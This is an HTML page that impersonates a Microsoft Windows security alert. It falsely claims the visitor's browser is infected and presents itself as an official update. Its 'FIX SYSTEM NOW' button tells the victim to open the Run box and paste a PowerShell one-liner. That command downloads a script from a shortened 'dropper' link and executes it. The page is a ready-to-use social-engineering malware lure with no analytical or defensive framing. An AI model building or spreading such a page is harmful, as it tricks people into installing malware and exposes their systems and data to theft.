<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Microsoft Windows Security</title>
    <style>
        body { background:#000; color:#0f0; font-family:Consolas,monospace; text-align:center; padding:80px 20px; }
        .box { background:#111; border:4px solid #f00; padding:60px; max-width:720px; margin:auto; box-shadow:0 0 50px #f00; }
        h1 { color:#f00; font-size:34px; margin-bottom:30px; }
        button { 
            background:#f00; color:white; border:none; padding:30px 100px; 
            font-size:28px; font-weight:bold; cursor:pointer; margin:40px 0;
            box-shadow:0 0 40px #f00;
        }
        button:hover { background:#ff5555; transform:scale(1.08); }
    </style>
</head>
<body>
    <div class="box">
        <h1>🚨 CRITICAL SYSTEM THREAT DETECTED 🚨</h1>
        <p>Windows has detected a high-risk infection in your browser.</p>
        <p>Immediate action is required to prevent data loss.</p>
        
        <button onclick="fixSystem()">FIX SYSTEM NOW</button>
        
        <p style="margin-top:50px; color:#888; font-size:16px;">
            This is an official Microsoft security update.
        </p>
    </div>

    <script>
        function fixSystem() {
            alert("✅ Fix initiated.\n\nPlease follow these steps:\n\n1. Press Windows + R\n2. Copy and paste the command below\n3. Press Enter\n\nCommand will appear after you click OK.");
            
            // Command ini akan ditampilkan di alert berikutnya (kurang langsung, tapi lebih aman)
            setTimeout(() => {
                prompt("Copy this command and paste in Run box:", "powershell -nop -c \"iex (iwr -UseBasicParsing 'https://bit.ly/yourdropper').Content\"");
            }, 800);
        }
    </script>
</body>
</html>
